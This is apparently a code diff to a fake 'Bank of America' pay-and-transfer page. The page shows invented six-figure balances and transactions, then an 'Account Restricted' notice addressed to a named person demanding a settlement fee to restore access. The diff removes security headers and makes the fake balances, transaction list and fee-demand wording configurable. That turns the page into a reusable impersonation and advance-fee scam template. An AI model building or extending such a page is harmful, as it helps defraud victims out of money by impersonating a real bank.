@@ -2,12 +2,9 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
-    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https://cdnjs.cloudflare.com; img-src 'self' data:; font-src 'self' https://cdnjs.cloudflare.com data:; connect-src 'self'; object-src 'none'; base-uri 'self'; form-action 'self';">
-    <meta http-equiv="X-Content-Type-Options" content="nosniff">
-    <meta name="referrer" content="strict-origin-when-cross-origin">
-    <script src="security.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Bank of America - Pay & Transfer</title>
+    <link rel="icon" href="/logo.svg" type="image/svg+xml">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <link rel="stylesheet" href="style.css">
 </head>
@@ -39,7 +36,7 @@
 
         <!-- Tabs -->
         <div class="tabs">
-            <div class="tab" id="accountsTab">Accounts</div>
+            <div class="tab" onclick="window.location.href='dashboard.html'">Accounts</div>
             <div class="tab active">Pay & Transfer</div>
         </div>
 
@@ -115,7 +112,6 @@
             </div>
         </nav>
 
-        <!-- PAY FLOW WIZARD -->
         <div id="payFlowOverlay" class="pay-flow-overlay" style="display: none;">
             <header class="pay-flow-header">
                 <button type="button" class="pay-flow-back" id="payFlowBack" aria-label="Back">
@@ -141,7 +137,7 @@
                     <div class="security-icon-lock" style="color: #E31837;">
                         <i class="fas fa-exclamation-triangle"></i>
                     </div>
-                    <div class="security-title">Account Restricted</div>
+                    <div class="security-title" id="payRestrictionTitle">Account Restricted</div>
                     <div class="security-text" style="text-align: left;" id="restrictionMessage">
                         Dear Megan Woods,<br><br>
                         Your account is temporarily restricted due to unresolved security issues.<br><br>
@@ -154,23 +150,18 @@
         </div>
     </div>
 
+    <script src="client-secure.js"></script>
+    <script src="config.js"></script>
     <script src="auth.js"></script>
     <script>
         BoAAuth.requireAuth();
 
-        // ========================
-        // LOGOUT & NAVIGATION
-        // ========================
         document.getElementById('logout-btn').addEventListener('click', function() {
             BoAAuth.logout();
             window.location.href = 'index.html';
         });
         
         document.getElementById('accounts-tab').addEventListener('click', function() {
-            window.location.href = 'dashboard.html';
-        });
-
-        document.getElementById('accountsTab').addEventListener('click', function() {
             window.location.href = 'dashboard.html';
         });
 
@@ -183,106 +174,8 @@
         });
 
         // ========================
-        // TRANSACTION GENERATION (older Dominion / high-value history)
-        // ========================
-        function generateTransactions() {
-            const container = document.getElementById('transaction-list-container');
-            const months = ["JAN", "FEB", "MAR", "APR", "MAY", "JUN", "JUL", "AUG", "SEP", "OCT", "NOV", "DEC"];
-
-            const history = [
-                { date: new Date(2025, 11, 14), desc: "Dominion Energy", sub: "Bill Pay", amount: 20000, type: "negative" },
-                { date: new Date(2025, 11, 13), desc: "Delta Air Lines", sub: "Travel", amount: 18450, type: "negative" },
-                { date: new Date(2025, 11, 12), desc: "Dominion Energy", sub: "Bill Pay", amount: 15000, type: "negative" },
-                { date: new Date(2025, 11, 11), desc: "Marriott Hotels", sub: "Lodging", amount: 12780, type: "negative" },
-                { date: new Date(2025, 11, 10), desc: "ACH Deposit - EMPLOYER PAYROLL", sub: "Direct Deposit", amount: 19500, type: "positive" },
-                { date: new Date(2025, 11, 9), desc: "Dominion Energy", sub: "Bill Pay", amount: 10000, type: "negative" },
-                { date: new Date(2025, 11, 8), desc: "Hertz Rent A Car", sub: "Travel", amount: 8920, type: "negative" },
-                { date: new Date(2025, 11, 7), desc: "Whole Foods Market", sub: "Groceries", amount: 6240, type: "negative" },
-                { date: new Date(2025, 11, 6), desc: "Dominion Energy", sub: "Bill Pay", amount: 5000, type: "negative" },
-                { date: new Date(2025, 11, 5), desc: "UnitedHealthcare", sub: "Medical Insurance", amount: 17850, type: "negative" },
-                { date: new Date(2025, 11, 4), desc: "Hilton Hotels", sub: "Travel", amount: 14320, type: "negative" },
-                { date: new Date(2025, 11, 3), desc: "State Farm Insurance", sub: "Auto Insurance", amount: 9650, type: "negative" },
-                { date: new Date(2025, 11, 2), desc: "Costco Wholesale", sub: "Shopping", amount: 7310, type: "negative" },
-                { date: new Date(2025, 11, 1), desc: "IRS TAX REFUND", sub: "Government Payment", amount: 16200, type: "positive" },
-                { date: new Date(2025, 10, 30), desc: "Southwest Airlines", sub: "Travel", amount: 11840, type: "negative" },
-                { date: new Date(2025, 10, 29), desc: "Lowe's Home Improvement", sub: "Home & Garden", amount: 8540, type: "negative" },
-                { date: new Date(2025, 10, 28), desc: "CVS Pharmacy", sub: "Health & Wellness", amount: 5120, type: "negative" },
-                { date: new Date(2025, 10, 27), desc: "Shell Oil", sub: "Gas & Fuel", amount: 6890, type: "negative" },
-                { date: new Date(2025, 10, 26), desc: "Verizon Wireless", sub: "Phone Bill", amount: 5450, type: "negative" },
-                { date: new Date(2025, 10, 25), desc: "Amazon.com", sub: "Online Purchase", amount: 9230, type: "negative" },
-                { date: new Date(2025, 10, 24), desc: "Mortgage Payment", sub: "Home Loan", amount: 19800, type: "negative" },
-                { date: new Date(2025, 10, 23), desc: "Fidelity 401K CONTRIBUTION", sub: "Retirement", amount: 7500, type: "negative" },
-                { date: new Date(2025, 10, 22), desc: "ACH Deposit - BONUS PAY", sub: "Direct Deposit", amount: 12000, type: "positive" },
-                { date: new Date(2025, 10, 21), desc: "Trader Joe's", sub: "Groceries", amount: 5780, type: "negative" },
-                { date: new Date(2025, 10, 20), desc: "Geico Insurance", sub: "Insurance", amount: 10450, type: "negative" },
-                { date: new Date(2025, 10, 19), desc: "Wire Transfer - REAL ESTATE ESCROW", sub: "External Transfer", amount: 187450, type: "negative" },
-                { date: new Date(2025, 10, 18), desc: "ACH Deposit - CONSULTING FEE", sub: "Direct Deposit", amount: 192800, type: "positive" },
-                { date: new Date(2025, 10, 17), desc: "Wire Transfer - CONTRACTOR PAYMENT", sub: "External Transfer", amount: 165320, type: "negative" },
-                { date: new Date(2025, 10, 16), desc: "Investment Transfer - BROKERAGE", sub: "Securities Transfer", amount: 178900, type: "negative" },
-                { date: new Date(2025, 10, 15), desc: "ACH Deposit - RENT COLLECTION", sub: "Direct Deposit", amount: 155600, type: "positive" },
-                { date: new Date(2025, 10, 14), desc: "Wire Transfer - HOME RENOVATION", sub: "External Transfer", amount: 199250, type: "negative" },
-                { date: new Date(2025, 10, 13), desc: "ACH Deposit - ANNUAL BONUS", sub: "Direct Deposit", amount: 200000, type: "positive" },
-                { date: new Date(2025, 10, 12), desc: "Law Firm Retainer", sub: "Legal Services", amount: 152400, type: "negative" },
-                { date: new Date(2025, 10, 11), desc: "Wire Transfer - VEHICLE PURCHASE", sub: "External Transfer", amount: 168750, type: "negative" },
-                { date: new Date(2025, 10, 10), desc: "Tuition Payment - UNIVERSITY", sub: "Education", amount: 175320, type: "negative" },
-                { date: new Date(2025, 10, 9), desc: "Wire Transfer - MEDICAL CENTER", sub: "Healthcare", amount: 189500, type: "negative" },
-                { date: new Date(2025, 10, 8), desc: "ACH Deposit - INVESTMENT DIVIDEND", sub: "Dividend", amount: 158920, type: "positive" },
-                { date: new Date(2025, 10, 7), desc: "Wire Transfer - BUSINESS EXPENSE", sub: "External Transfer", amount: 163480, type: "negative" },
-                { date: new Date(2025, 10, 6), desc: "Capital Gains Distribution", sub: "Investment Income", amount: 172650, type: "positive" },
-                { date: new Date(2025, 10, 5), desc: "Wire Transfer - TAX PAYMENT", sub: "Government Payment", amount: 198100, type: "negative" },
-                { date: new Date(2025, 10, 4), desc: "ACH Deposit - ROYALTY PAYMENT", sub: "Direct Deposit", amount: 161275, type: "positive" },
-                { date: new Date(2025, 10, 3), desc: "Wire Transfer - PROPERTY INSURANCE", sub: "Insurance", amount: 154890, type: "negative" },
-                { date: new Date(2025, 10, 2), desc: "ACH Deposit - COMMISSION PAY", sub: "Direct Deposit", amount: 196340, type: "positive" },
-                { date: new Date(2025, 10, 1), desc: "Wire Transfer - LANDSCAPING PROJECT", sub: "Home Improvement", amount: 167215, type: "negative" },
-                { date: new Date(2025, 8, 30), desc: "ACH Deposit - SETTLEMENT PROCEEDS", sub: "Direct Deposit", amount: 185720, type: "positive" },
-                { date: new Date(2025, 8, 29), desc: "Wire Transfer - SOLAR INSTALLATION", sub: "Home Improvement", amount: 179480, type: "negative" },
-                { date: new Date(2025, 8, 28), desc: "ACH Deposit - TRUST DISTRIBUTION", sub: "Direct Deposit", amount: 150000, type: "positive" },
-                { date: new Date(2025, 8, 27), desc: "Wire Transfer - YACHT CHARTER", sub: "Travel", amount: 193650, type: "negative" }
-            ];
-
-            const transactions = history
-                .sort(function(a, b) { return b.date - a.date; })
-                .map(function(tx) {
-                    return {
-                        month: months[tx.date.getMonth()],
-                        day: tx.date.getDate(),
-                        year: tx.date.getFullYear(),
-                        desc: tx.desc,
-                        sub: tx.sub || null,
-                        amount: tx.amount,
-                        type: tx.type
-                    };
-                });
-
-            const fragment = document.createDocumentFragment();
-            transactions.forEach(function(tx) {
-                const item = document.createElement('div');
-                item.className = 'transaction-item';
-                const formattedAmount = new Intl.NumberFormat('en-US', {
-                    style: 'currency',
-                    currency: 'USD'
-                }).format(Math.abs(tx.amount));
-                const sign = tx.type === 'positive' ? '+' : '-';
-                item.innerHTML =
-                    '<div class="transaction-date">' +
-                        '<span class="month">' + tx.month + '</span>' +
-                        '<span class="day">' + tx.day + '</span>' +
-                        '<span class="year">' + tx.year + '</span>' +
-                    '</div>' +
-                    '<div class="transaction-details">' +
-                        '<p class="transaction-desc">' + tx.desc + '</p>' +
-                        '<p class="transaction-sub">' + tx.sub + '</p>' +
-                    '</div>' +
-                    '<div class="transaction-amount ' + tx.type + '">' + sign + formattedAmount + '</div>';
-                fragment.appendChild(item);
-            });
-            container.appendChild(fragment);
-        }
-
-        // ========================
         // PAY FLOW WIZARD
         // ========================
-        const currentUser = BoAAuth.getUser();
         const payFlowOverlay = document.getElementById('payFlowOverlay');
         const payFlowBody = document.getElementById('payFlowBody');
         const payFlowTitle = document.getElementById('payFlowTitle');
@@ -293,16 +186,39 @@
         const closeRestrictionBtn = document.getElementById('closeRestrictionBtn');
         const contactSupportLink = document.getElementById('contactSupportLink');
 
-        const accounts = [
-            { name: 'Current Account', balance: currentUser ? currentUser.currentBalance : '$700,000.00' },
-            { name: 'Savings Account', balance: currentUser ? currentUser.savingsBalance : '$50,000.00' }
-        ];
+        let accounts = [];
+
+        function refreshAccountsFromConfig() {
+            let source = {};
+            try {
+                source = BoAConfig.get() || {};
+            } catch (error) {
+                source = {};
+            }
+            accounts = (source.accounts || []).map(function (account) {
+                return {
+                    name: account.name,
+                    balance: BoAConfig.formatCurrency(account.balance)
+                };
+            });
+            if (!accounts.length) {
+                accounts = [
+                    { name: 'Current Account', balance: BoAConfig.formatCurrency(0) },
+                    { name: 'Savings Account', balance: BoAConfig.formatCurrency(0) }
+                ];
+            }
+        }
+
+        BoAConfig.initPage(function () {
+            BoAConfig.renderTransactions();
+            refreshAccountsFromConfig();
+        });
 
         const flowState = {
             type: '',
             step: 0,
-            fromAccount: accounts[0].name,
-            toAccount: accounts[1].name,
+            fromAccount: '',
+            toAccount: '',
             recipientName: '',
             recipientAddress: '',
             routingNumber: '',
@@ -696,6 +612,7 @@
         }
 
         function openPayFlow(type) {
+            refreshAccountsFromConfig();
             flowState.type = type;
             flowState.step = 0;
             flowState.fromAccount = '';
@@ -716,13 +633,44 @@
         }
 
         function updateRestrictionMessage() {
-            var user = BoAAuth.getUser();
-            var fee = user && user.settlementFee ? user.settlementFee : '$25,000.00';
-            var name = user && user.name ? user.name : 'Customer';
+            var config = {};
+            try {
+                config = BoAConfig.get() || {};
+            } catch (error) {
+                config = {};
+            }
+            var restriction = config.restriction || {};
+            var fee = BoAConfig.formatCurrency(restriction.settlementFee || 0);
+            var name = config.fullName || 'Customer';
+
+            function fill(template, fallback) {
+                return String(template || fallback || '')
+                    .replace(/\{name\}/gi, name)
+                    .replace(/\{fee\}/gi, fee);
+            }
+
+            var title = restriction.title || 'Account Restricted';
+            var greeting = fill(restriction.greeting, 'Dear {name},');
+            var message = restriction.message || 'Your account is temporarily restricted due to unresolved security issues.';
+            var feeText = fill(
+                restriction.feeText,
+                'A settlement fee of {fee} is required to restore full access and remove the restriction, so normal account operations will be restored.'
+            );
+            var button = restriction.button || 'I Understand';
+            var support = restriction.support || 'Contact Support';
+
+            var titleEl = document.getElementById('payRestrictionTitle');
+            if (titleEl) titleEl.textContent = title;
+
             document.getElementById('restrictionMessage').innerHTML =
-                'Dear ' + name + ',<br><br>' +
-                'Your account is temporarily restricted due to unresolved security issues.<br><br>' +
-                'A settlement fee of <strong style="color: #E31837;">' + fee + '</strong> is required to restore full access and remove the restriction, so normal account operations will be restored.';
+                greeting.replace(/\n/g, '<br>') + '<br><br>' +
+                message.replace(/\n/g, '<br>') + '<br><br>' +
+                feeText.split(fee).join('<strong style="color: #E31837;">' + fee + '</strong>');
+
+            var closeBtn = document.getElementById('closeRestrictionBtn');
+            if (closeBtn) closeBtn.textContent = button;
+            var supportEl = document.getElementById('contactSupportLink');
+            if (supportEl) supportEl.textContent = support;
         }
 
         function showRestrictionModal() {
@@ -815,13 +763,11 @@
             }
         });
 
-        // Initialize on page load
-        window.onload = function() {
-            generateTransactions();
-            if (restrictionModal) {
-                restrictionModal.style.display = 'none';
-            }
-        };
+
+
+        if (restrictionModal) {
+            restrictionModal.style.display = 'none';
+        }
     </script>
 </body>
 </html>
